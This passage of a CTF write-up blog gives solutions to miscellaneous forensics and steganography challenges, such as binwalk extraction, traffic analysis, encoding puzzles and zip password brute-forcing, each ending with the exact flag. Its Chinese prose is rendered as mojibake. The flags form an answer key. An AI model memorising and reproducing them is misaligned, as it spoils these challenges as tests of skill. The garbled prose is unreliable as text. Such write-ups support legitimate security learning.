class="line">        n_num.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line">rlt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines)):</span><br><span class="line">    tmp = <span class="built_in">bin</span>(n_num[i])[<span class="number">2</span>:]</span><br><span class="line">    tmp = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(tmp)) + tmp</span><br><span class="line">    rlt += tmp[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">rlt2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rlt), <span class="number">8</span>):</span><br><span class="line">    rlt2 += <span class="built_in">chr</span>(<span class="built_in">int</span>(rlt[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;fi.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(rlt2.rstrip())</span><br><span class="line"></span><br><span class="line">hexData = <span class="built_in">open</span>(<span class="string">&#x27;fi.txt&#x27;</span>).read()</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;fi.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(binascii.unhexlify(hexData))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>ä¿®æ­£æ‰€å¾—å‹ç¼©åŒ…çš„ä¼ªåŠ å¯†ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ã€‚å¯¹å…¶å¾ªç¯ base64 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œè·Ÿåˆ°ä¸€ä¸ª POST è¯·æ±‚å¤„å¯ä»¥çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898036249/70b5f969f440c4e1164e3b28d6f00e8901cb121e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;password_is_not_weak&#125;</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h3><p>å¾ˆåƒ PC Logo çš„ä»£ç ï¼Œåˆä¸­çš„æ—¶å€™ç©è¿‡ä¸€äº›ã€‚å¯æƒœçš„æ˜¯ PC Logo ä¸å…¼å®¹ x64 çš„ç³»ç»Ÿäº†ï¼Œåªèƒ½æ‰¾äº†ä¸ªåœ¨çº¿çš„<a href="https://www.calormen.com/jslogo/">è§£é‡Šå™¨</a>ã€‚å°†ä»£ç ç²˜è´´è¿›å»æ‰§è¡Œå¯ä»¥å¾—åˆ°ä¸€å¹…å›¾ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898126083/97a2dd9b2237695edcf8f35e6440ec50ca7281c2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;RCTF_HeyLogo&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018æ’ä½èµ›-é€šè¡Œè¯"><a href="#XMAN2018æ’ä½èµ›-é€šè¡Œè¯" class="headerlink" title="[XMAN2018æ’ä½èµ›]é€šè¡Œè¯"></a>[XMAN2018æ’ä½èµ›]é€šè¡Œè¯</h3><p>å…ˆå¯¹é™„ä»¶ç»™å‡ºçš„å­—ç¬¦ä¸²è§£ base64ï¼Œå†ä»¥ 7 ä¸º key åš Rail Fence Cipher Encodeï¼Œå† ROT13 ä¸€æ¬¡ï¼Œå°±å¯ä»¥å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898243968/6f9e379347082dcb99ef299abc6ecd4810ef9598.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xman&#123;oyay_now_you_get_it&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯-2019-easy-misc"><a href="#å®‰æ´µæ¯-2019-easy-misc" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy misc"></a>[å®‰æ´µæ¯ 2019]easy misc</h3><p>è§£å‹å‡ºçš„æ–‡ä»¶ä¸­ï¼Œdecode.zip ä¸­åŒ…å«æœ‰å¤‡æ³¨ <code>FLAG IN ((âˆš2524921X85Ã·5+2)Ã·15-1794)+NNULLULL,</code>ï¼Œ<code>(âˆš2524921X85Ã·5+2)Ã·15-1794)</code> å¯ç®—å¾—ç»“æœä¸º 7ã€‚ä½¿ç”¨ ARCHPR çˆ†ç ´å‡ºå‹ç¼©åŒ…å¯†ç ä¸º <code>2019456NNULLULL,</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898339935/c9a53496652ba615b8a7175d5ee8e41b26720f88.png" alt="image-20210127230237637"></p><p>å¾—åˆ°å­—æ¯å¯¹åº”å­—ç¬¦ä¸²çš„æ›¿æ¢ï¼Œæ¨æµ‹éœ€è¦åšè¯é¢‘åˆ†æã€‚çœ‹äº†çœ‹ç½‘ä¸Šçš„ WriteUpï¼Œå‘ç°æˆ‘çš„ç›²æ°´å°åˆ†æä¸å‡ºæ¥ï¼Œå¯èƒ½æ˜¯å·¥å…·æœ‰é—®é¢˜ï¼Œå…ˆè®°ä¸‹ç­”æ¡ˆå¾€ä¸‹èµ°ï¼Œå¯¹ 11.txt åšè¯é¢‘åˆ†æã€‚æ ¹æ® readç›®å½•ä¸‹çš„æç¤ºï¼Œå–å‡ºè¯é¢‘å‰ 16 çš„è¯ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">é¢‘æ•°ç¬¬1: (&#39; &#39;, 75435)</span><br><span class="line">é¢‘æ•°ç¬¬2: (&#39;e&#39;, 39628)</span><br><span class="line">é¢‘æ•°ç¬¬3: (&#39;t&#39;, 27993)</span><br><span class="line">é¢‘æ•°ç¬¬4: (&#39;a&#39;, 25887)</span><br><span class="line">é¢‘æ•°ç¬¬5: (&#39;o&#39;, 25809)</span><br><span class="line">é¢‘æ•°ç¬¬6: (&#39;n&#39;, 21337)</span><br><span class="line">é¢‘æ•°ç¬¬7: (&#39;r&#39;, 20990)</span><br><span class="line">é¢‘æ•°ç¬¬8: (&#39;h&#39;, 19535)</span><br><span class="line">é¢‘æ•°ç¬¬9: (&#39;i&#39;, 19422)</span><br><span class="line">é¢‘æ•°ç¬¬10: (&#39;s&#39;, 18870)</span><br><span class="line">é¢‘æ•°ç¬¬11: (&#39;d&#39;, 15932)</span><br><span class="line">é¢‘æ•°ç¬¬12: (&#39;l&#39;, 14385)</span><br><span class="line">é¢‘æ•°ç¬¬13: (&#39;u&#39;, 9562)</span><br><span class="line">é¢‘æ•°ç¬¬14: (&#39;y&#39;, 8293)</span><br><span class="line">é¢‘æ•°ç¬¬15: (&#39;g&#39;, 8127)</span><br><span class="line">é¢‘æ•°ç¬¬16: (&#39;w&#39;, 7744)</span><br></pre></td></tr></table></figure><p>çœ‹äº†çœ‹åˆ«äººçš„ WriteUpï¼Œè¯é¢‘ç®—å‡ºæ¥å·®ä¸å¤šä½†æ˜¯å†…å®¹å´å·®äº†è›®å¤šçš„ï¼Œæœ‰ç‚¹è¿·ã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE/WSFTajBtcw= //æˆ‘æ‹¼æ¥çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="addition">+ QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw== //å®˜æ–¹ WriteUp çš„å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure><p>å°†æ‹¼æ¥å‡ºæ¥çš„å­—ç¬¦ä¸² base64 è§£ç ä¸€æ¬¡å† base85 è§£ç ä¸€æ¬¡å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;have_a_good_day1&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h3><p>åœ¨è§£å‹å‡ºçš„éŸ³é¢‘å°¾éƒ¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸² AES å¯†æ–‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;nSQN+hoHL8OwV9iJB&#x2F;mSdKk5dmusulz4&#x3D;</span><br></pre></td></tr></table></figure><p>binwalk å¯çŸ¥ JM.png ä¸­åŒ…å«å¤šä¸ªå›¾ç‰‡ï¼Œ<code>binwalk -e</code> åˆ†ç¦»å¯ä»¥å¾—åˆ°ä¸€ä¸ªå›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898413936/2f9dffbe95b477175e52c3ca3342f9ba5b4849ac.png" alt="aes"></p><p>å°†å…¶ä½œä¸º AES çš„ key å¯ä»¥è§£å‡ºæ˜æ–‡ <code>CCGandGulu</code>ã€‚å°†è§£å‡ºçš„æ˜æ–‡ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ win-win.zip å¯ä»¥å¾—åˆ°ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ã€‚SilentEye å¯è§£å‡º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898495960/c7439103a74ca59eced947abc7803b7891e377fa.png" alt="image-20210128003903001"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;Th1s_is_the_3nd1n9&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-code-obfuscation"><a href="#GKCTF2020-code-obfuscation" class="headerlink" title="[GKCTF2020]code obfuscation"></a>[GKCTF2020]code obfuscation</h3><p>å°†å›¾ç‰‡ä¿®å¤å¥½ï¼Œæ‰«æåå¾—åˆ°ä¿¡æ¯ <code>base(gkctf)</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898564555/2c8040721a3082c7c531e191fe3935bc3091ac78.png"></p><p>binwalk å¯çŸ¥å›¾ç‰‡ä¸­åŒ…å«ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œ<code>binwalk -e</code> åˆ†ç¦»ã€‚æ ¹æ®ä¸Šä¸€æ­¥çš„ä¿¡æ¯ï¼Œå°è¯•åå¯çŸ¥å‹ç¼©åŒ…å¯†ç ä¸º <code>base58(gkctf)</code>ï¼Œå³ <code>CfjxaPF</code>ã€‚</p><h3 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h3><p>å°† docx æ–‡ä»¶è§£å‹ååœ¨ media æ–‡ä»¶å¤¹å†…å¯æ‰¾åˆ° flag å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898674662/58e06720688738ba5eea0d63608558d1b4ee794f.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;unz1p_3v3ryth1ng&#125;</span><br></pre></td></tr></table></figure><h3 id="GKCTF2020-Harley-Quinn"><a href="#GKCTF2020-Harley-Quinn" class="headerlink" title="[GKCTF2020]Harley Quinn"></a>[GKCTF2020]Harley Quinn</h3><p>é™„ä»¶å‹ç¼©åŒ…çš„å¤‡æ³¨é‡Œæœ‰éœ€è¦ç”¨åˆ°çš„å·¥å…·æç¤ºã€‚ä¸‹è½½ FreeFileCamouflageï¼Œå‘ç°æ˜¯å›¾ç‰‡æå–è½¯ä»¶ã€‚å›¾ç‰‡çš„å±æ€§ä¸­æœ‰ #password# å­—æ ·ï¼Œå¬åˆ°æœ€åå‘ç°æœ‰ DTMFï¼Œä¸Šä¼ åˆ°å·¥å…·è¯†åˆ«ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213898795053/a667fca4a820a7c79bd69333a9b317b494473e09.png"></p><p>å¾—åˆ° <code>btdipdun</code>ï¼Œå› ä¸ºæç¤ºè¯´å¯è¯»çŸ­å¥ï¼Œç¨ä½œä¿®æ­£åå¯å¾—åˆ° <code>ctfisfun</code>ã€‚å°†å…¶ä½œä¸ºå¯†ç æå–å›¾ç‰‡ä¸­çš„éšå†™å³å¯å¾—åˆ° flag æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Pudd1n!!_y0u_F1nd_m3!&#125;</span><br></pre></td></tr></table></figure><h3 id="æ´¾å¤§æ˜Ÿçš„çƒ¦æ¼"><a href="#æ´¾å¤§æ˜Ÿçš„çƒ¦æ¼" class="headerlink" title="æ´¾å¤§æ˜Ÿçš„çƒ¦æ¼"></a>æ´¾å¤§æ˜Ÿçš„çƒ¦æ¼</h3><p>æ ¹æ®é¢˜ç›®æè¿°ï¼Œåœ¨å›¾ç‰‡ä¸­æ‰¾åˆ°åŒºå—å¹¶å¤åˆ¶å‡ºæ¥å¾—åˆ°å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;DD&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;&quot;DD&quot;DD&quot;&quot;D&quot;&quot;DDD&quot;&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;&quot;&quot;DD&quot;&quot;D&quot;&quot;&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;&quot;&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;DD&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;DD&quot;DD&quot;&quot;D&quot;D&quot;&quot;DD&quot;D&quot;D&quot;DD&quot;&quot;&quot;D&quot;&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;&quot;DD&quot;D&quot;D&quot;&quot;DD&quot;&quot;&quot;D&quot;DD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;&quot;&quot;DDD&quot;&quot;DD&quot;&quot;DD&quot;&quot;&quot;D&quot;&quot;DD&quot;&quot;</span><br></pre></td></tr></table></figure><p>å°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¾—åˆ°äº†å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æƒ³åŠæ³•æŠŠå®ƒè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç»è¿‡å°è¯•å¾—å‡º <code>reverse-&gt;From Binary-&gt;reverse</code> çš„è·¯å¾„ï¼Œå¾—å‡ºæ­£ç¡®çš„ flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6406950a54184bd5fe6b6e5b4ce43832&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h3><p>010 editor æ‰“å¼€è§£å‹å‡ºçš„å›¾ç‰‡ï¼Œå‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œæå–å‡ºæ¥ä¹‹åå‘ç°å‹ç¼©åŒ…éœ€è¦å¯†ç ã€‚å°†å›¾ç”¨ StegSolve å¯è§£å¾—å¦ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899036243/7a82ceb07c58b786710133a32546e8b1990c61c5.png"></p><p>å°†å…¶ä¿å­˜ä¸‹æ¥ï¼Œæ‰“å¼€æŸ¥çœ‹å‘ç°å‹ç¼©åŒ…å¯†ç ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899206462/eca123fb996f3692ea378d6e5493c072f147013e.png"></p><p>å°†å‹ç¼©åŒ…è§£å‹ä¹‹åå¾—åˆ°äº†å¾ˆå¤šæ•°å­—ï¼Œçœ‹å½¢å¼åƒ TTL ä¿¡æ¯éšå†™ã€‚ç”¨è„šæœ¬è·‘å‡ºä¿¡æ¯ <code>rar-passwd:0ac1fe6b77be5dbe</code>ã€‚ä¾æ­¤è§£å¼€ rar å‹ç¼©æ–‡æ¡£ä¹‹åå¾—åˆ°ä¸€ä¸ª Word æ–‡æ¡£ã€‚ä¿®æ­£å…¶æ‹“å±•ååæ‰“å¼€ï¼Œå¾—åˆ°ä¸€ä¸² base64ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span><br><span class="line">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span><br><span class="line">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span><br></pre></td></tr></table></figure><p>å¯¹å…¶é€è¡Œè§£å¯†åå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">110110111111110011110111111111111111111111111111101110000001111111111001101</span><br><span class="line">110110110001101011110111111111111111111111111111111101111111111111110110011</span><br><span class="line">110000101110111011110111111100011111111111001001101110000011111000011111111</span><br><span class="line">110110100001111011110111111011101111111110110110101111111100110111111111111</span><br><span class="line">110110101111111011110111101011101111111110110110101101111100110111111111111</span><br><span class="line">110110100001100000110000001100011100000110110110101110000001111000011111111</span><br></pre></td></tr></table></figure><p>æ›¿æ¢å­—ç¬¦å¯ä»¥æ›´ç›´è§‚å¾—çœ‹åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0  0        00    0                            0   000000          00  0 </span><br><span class="line">0  0  000  0 0    0                               0               0  00  </span><br><span class="line">0000 0   0   0    0       000           00 00  0   00000     0000        </span><br><span class="line">0  0 0000    0    0      0   0         0  0  0 0        00  0            </span><br><span class="line">0  0 0       0    0    0 0   0         0  0  0 0  0     00  0            </span><br><span class="line">0  0 0000  00000  000000  000   00000  0  0  0 0   000000    0000        </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;He1Lo_mi5c~&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-zippy"><a href="#BSidesSF2019-zippy" class="headerlink" title="[BSidesSF2019]zippy"></a>[BSidesSF2019]zippy</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œè¿½è¸ª TCP æµé‡ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°å‹ç¼©æ–‡æ¡£å’Œå‹ç¼©æ–‡æ¡£çš„å¯†ç ï¼Œæå–å‡ºæ¥è§£å‹æ–‡æ¡£å³å¯å¾—åˆ° flag æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899283584/ec40c6833f6a17f0f18176221eb61637a7853e49.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899347029/97d951be27918489a4d40a216f31072b43177579.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;this_flag_is_your_flag&#125;</span><br></pre></td></tr></table></figure><h3 id="ç²½å­çš„æ¥å†"><a href="#ç²½å­çš„æ¥å†" class="headerlink" title="ç²½å­çš„æ¥å†"></a>ç²½å­çš„æ¥å†</h3><p>å°†è§£å‹æ‰€å¾—çš„ Word æ–‡æ¡£æ–‡ä»¶ä¿®å¤ï¼Œæ‰“å¼€å¯å¾—è¯—å¥ã€‚æ ¹æ®ä¸åŒçš„è¡Œè·å°†å…¶è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ ‡è®°å¾—åˆ°å¦‚ä¸‹æ•°æ®ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10010100010</span><br><span class="line">101010010011</span><br><span class="line">100100100001</span><br><span class="line">111100100001</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«å°†å…¶ç”¨ MD5 æ‘˜è¦ä¹‹åå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">447b98f8c092f12a4773ca9809ef6b5f</span><br><span class="line">59f3bfe7c1e00ba34e4558cf295544bc</span><br><span class="line">d473ee3def34bd022f8e5233036b3345</span><br><span class="line">d579f5f8d6c01ec08971fbc0c68f1ddd</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç¬¬ä¸‰ä¸ªä¸º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d473ee3def34bd022f8e5233036b3345&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-file-header"><a href="#UTCTF2020-file-header" class="headerlink" title="[UTCTF2020]file header"></a>[UTCTF2020]file header</h3><p>ä¿®å¤é™„ä»¶çš„ PNG æ–‡ä»¶å¤´ <code>89 50 4E 47</code>ï¼ŒæŸ¥çœ‹å›¾ç‰‡å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;3lit3_h4ck3r&#125;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="[WUSTCTF2020]spaceclub"></a>[WUSTCTF2020]spaceclub</h3><p>æ‰“å¼€æ–‡ä»¶åå…¨é€‰å¯è§é•¿çŸ­é”™è½çš„ç©ºæ ¼ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899420208/01bed04a4b41c7f3aa9fd01a1d349f545fd58b87.png"></p><p>å°†çŸ­è¡Œè½¬æ¢ä¸º 0ï¼Œé•¿è¡Œè½¬æ¢ä¸º 1ï¼Œå¾—åˆ°å¦‚ä¸‹å­—ç¬¦ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</span><br></pre></td></tr></table></figure><p>å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-music"><a href="#ACTFæ–°ç”Ÿèµ›2020-music" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]music"></a>[ACTFæ–°ç”Ÿèµ›2020]music</h3><p>010 editor æ‰“å¼€æ–‡ä»¶çœ‹åˆ°æ–‡ä»¶å¤´ä¸º <code>A1 A1 A1</code> ä½†æ˜¯ m4a çš„æ–‡ä»¶å¤´åº”è¯¥ä¸º <code>00 00 00</code>ï¼Œäºæ˜¯çŒœæµ‹å…¶å¯¹æ–‡ä»¶è¿›è¡Œäº†å¼‚æˆ–è¿ç®—ã€‚å°†æ–‡ä»¶å¯¼å…¥ CyberChef ä¸­è¿›è¡Œå¼‚æˆ–å¾—åˆ°åŸæ–‡ä»¶ã€‚æ‰“å¼€æ–‡ä»¶å³å¯å¬å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;abcdfghijk&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-basic-forensics"><a href="#UTCTF2020-basic-forensics" class="headerlink" title="[UTCTF2020]basic-forensics"></a>[UTCTF2020]basic-forensics</h3><p>ä¿®æ­£æ–‡ä»¶æ‹“å±•åï¼Œæœç´¢ flag å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;fil3_ext3nsi0ns_4r3nt_r34l&#125;</span><br></pre></td></tr></table></figure><h3 id="SCTF2019-ç”µå•è½¦"><a href="#SCTF2019-ç”µå•è½¦" class="headerlink" 